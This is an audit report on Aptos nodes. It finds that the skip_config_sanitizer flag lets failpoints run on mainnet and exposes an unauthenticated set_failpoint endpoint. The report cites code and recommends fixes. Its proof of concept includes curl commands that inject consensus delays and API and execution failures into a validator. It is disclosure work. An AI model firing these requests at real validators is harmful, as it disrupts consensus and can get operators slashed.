# Audit Report

## Title
Failpoint Configuration Bypass via skip_config_sanitizer Allows Unauthenticated Chaos Injection on Production Nodes

## Summary
The Aptos node's failpoint system, designed for chaos engineering in test environments, can leak into production traffic if operators set `skip_config_sanitizer: true` in node configuration. This bypasses mainnet protection checks, enabling the unauthenticated `/v1/set_failpoint` API endpoint, which allows any network attacker to inject arbitrary failpoints causing validator node failures, API crashes, and consensus disruption.

## Finding Description

The Aptos codebase implements multiple protection layers to prevent failpoints (chaos testing features) from being enabled on mainnet nodes: [1](#0-0) [2](#0-1) 

However, these protections can be completely bypassed using a configuration flag: [3](#0-2) 

The `skip_config_sanitizer` flag is user-configurable: [4](#0-3) 

When this bypass is active, operators can enable failpoints on mainnet nodes by setting `api.failpoints_enabled: true`. This activates the `/v1/set_failpoint` endpoint: [5](#0-4) 

**Critical Issue**: This endpoint has **no authentication**: [6](#0-5) 

The only check is `context.failpoints_enabled()`, which reads from configuration - there is no verification of the caller's identity or authorization.

**Attack Path**:
1. Operator compiles node with `--features failpoints` for "production-like testing"
2. Operator sets in mainnet node config:
   ```yaml
   node_startup:
     skip_config_sanitizer: true
   api:
     failpoints_enabled: true
   ```
3. Node starts on mainnet, bypassing all sanitizer checks
4. Attacker discovers API at `http://<node-ip>:8080/v1/set_failpoint`
5. Attacker injects failpoints without authentication:
   - `GET /v1/set_failpoint?name=api::get_transactions&actions=return` (crashes transaction API)
   - `GET /v1/set_failpoint?name=consensus::process_proposal&actions=100%delay(5000)` (delays consensus by 5 seconds)
6. Validator experiences API failures, consensus timeouts, and execution errors
7. Validator falls out of consensus, misses blocks, gets slashed

## Impact Explanation

**High Severity** (per Aptos Bug Bounty criteria):
- **Validator node slowdowns**: Injected delays in consensus paths cause missed proposals
- **API crashes**: Failpoints can return errors for all API endpoints
- **Significant protocol violations**: Consensus timing assumptions broken by artificial delays

This violates the **Consensus Safety** and **Resource Limits** invariants. While not directly causing funds loss, it enables denial-of-service against validators that can result in slashing penalties.

## Likelihood Explanation

**Moderate-to-High Likelihood**:
- Operators may use `skip_config_sanitizer` to bypass other "annoying" config warnings
- Production-like staging environments often enable failpoints for chaos testing
- Configuration files may be copied from staging to production without proper sanitization
- The lack of authentication means ANY network attacker can exploit once misconfigured
- Default API binding (`0.0.0.0:8080`) exposes endpoint to all network interfaces

The vulnerability requires operator misconfiguration, but the consequences are severe and the attack surface (unauthenticated HTTP endpoint) is trivially exploitable.

## Recommendation

**Immediate Fixes**:

1. **Add runtime mainnet check in failpoint handler**:
```rust
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    // NEW: Block mainnet regardless of config
    if context.chain_id().is_mainnet() {
        return Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not permitted on mainnet"
        )));
    }
    
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        // ... rest of implementation
    }
}
```

2. **Restrict skip_config_sanitizer in production builds**:
```rust
impl Default for NodeStartupConfig {
    fn default() -> Self {
        Self {
            skip_config_optimizer: false,
            #[cfg(not(feature = "failpoints"))]
            skip_config_sanitizer: false,
            #[cfg(feature = "failpoints")]
            skip_config_sanitizer: false, // Never allow in production
        }
    }
}
```

3. **Add authentication to failpoint endpoint** (reuse admin service auth): [7](#0-6) 

Apply similar authentication middleware to the failpoint endpoint.

4. **Add monitoring alerts** for production nodes with failpoints enabled.

## Proof of Concept

**Setup (simulating misconfigured mainnet node)**:
```bash
# 1. Build with failpoints
cargo build --release --features failpoints

# 2. Create config with bypass
cat > node_config.yaml <<EOF
base:
  role: "validator"
  data_dir: "/opt/aptos/data"
  
node_startup:
  skip_config_sanitizer: true  # BYPASS!
  
api:
  enabled: true
  address: "0.0.0.0:8080"
  failpoints_enabled: true  # Normally blocked on mainnet
  
execution:
  genesis_file_location: "mainnet-genesis.blob"
EOF

# 3. Start node (will bypass sanitizer checks)
./aptos-node -f node_config.yaml

# 4. Attacker injects failpoints (NO AUTH REQUIRED)
curl "http://<validator-ip>:8080/v1/set_failpoint?name=consensus::process_proposal&actions=100%delay(10000)"
# Result: All consensus proposals delayed by 10 seconds

curl "http://<validator-ip>:8080/v1/set_failpoint?name=api::get_account&actions=return"
# Result: All account API calls return errors

curl "http://<validator-ip>:8080/v1/set_failpoint?name=execution::execute_block&actions=50%return"
# Result: 50% of block executions fail
```

**Validation**:
The node will experience:
- Consensus timeout errors (missed proposals due to 10s delays)
- API endpoint failures (returning internal errors)
- Execution failures (blocks fail to execute)
- Eventual slashing due to low participation rate

**Notes**

This vulnerability represents a **defense-in-depth failure** where configuration bypass mechanisms intended for testing can be abused to enable dangerous features on production networks. The combination of:
1. Bypassable sanitizer checks via `skip_config_sanitizer`
2. Unauthenticated failpoint injection endpoint
3. Lack of runtime mainnet detection beyond sanitizer

Creates a severe risk when operators misconfigure production nodes, either accidentally (copying test configs) or intentionally (for "production debugging"). The fix requires both preventing the bypass on mainnet and adding authentication as a secondary defense layer.

### Citations

**File:** config/src/config/config_sanitizer.rs (L44-48)
```rust
    ) -> Result<(), Error> {
        // If config sanitization is disabled, don't do anything!
        if node_config.node_startup.skip_config_sanitizer {
            return Ok(());
        }
```

**File:** config/src/config/config_sanitizer.rs (L74-109)
```rust
fn sanitize_failpoints_config(
    node_config: &NodeConfig,
    _node_type: NodeType,
    chain_id: Option<ChainId>,
) -> Result<(), Error> {
    let sanitizer_name = FAILPOINTS_SANITIZER_NAME.to_string();
    let failpoints = &node_config.failpoints;

    // Verify that failpoints are not enabled in mainnet
    let failpoints_enabled = are_failpoints_enabled();
    if let Some(chain_id) = chain_id {
        if chain_id.is_mainnet() && failpoints_enabled {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "Failpoints are not supported on mainnet nodes!".into(),
            ));
        }
    }

    // Ensure that the failpoints config is populated appropriately
    if let Some(failpoints) = failpoints {
        if failpoints_enabled && failpoints.is_empty() {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "Failpoints are enabled, but the failpoints config is empty?".into(),
            ));
        } else if !failpoints_enabled && !failpoints.is_empty() {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "Failpoints are disabled, but the failpoints config is not empty!".into(),
            ));
        }
    }

    Ok(())
}
```

**File:** config/src/config/api_config.rs (L163-200)
```rust
impl ConfigSanitizer for ApiConfig {
    fn sanitize(
        node_config: &NodeConfig,
        node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();
        let api_config = &node_config.api;

        // If the API is disabled, we don't need to do anything
        if !api_config.enabled {
            return Ok(());
        }

        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }

        // Validate basic runtime properties
        if api_config.max_runtime_workers.is_none() && api_config.runtime_worker_multiplier == 0 {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "runtime_worker_multiplier must be greater than 0!".into(),
            ));
        }

        // Sanitize the gas estimation config
        GasEstimationConfig::sanitize(node_config, node_type, chain_id)?;

        Ok(())
    }
}
```

**File:** config/src/config/node_startup_config.rs (L6-21)
```rust
#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct NodeStartupConfig {
    pub skip_config_optimizer: bool, // Whether or not to skip the config optimizer at startup
    pub skip_config_sanitizer: bool, // Whether or not to skip the config sanitizer at startup
}

#[allow(clippy::derivable_impls)] // Derive default manually (this is safer than guessing defaults)
impl Default for NodeStartupConfig {
    fn default() -> Self {
        Self {
            skip_config_optimizer: false,
            skip_config_sanitizer: false,
        }
    }
}
```

**File:** api/src/runtime.rs (L248-251)
```rust
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** api/src/set_failpoints.rs (L21-40)
```rust
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-181)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
            for authentication_config in &context.config.authentication_configs {
                match authentication_config {
                    AuthenticationConfig::PasscodeSha256(passcode_sha256) => {
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
                    },
                }
            }
        };

        if !authenticated {
            return Ok(reply_with_status(
                StatusCode::NETWORK_AUTHENTICATION_REQUIRED,
                format!("{} endpoint requires authentication.", req.uri().path()),
            ));
        }
```
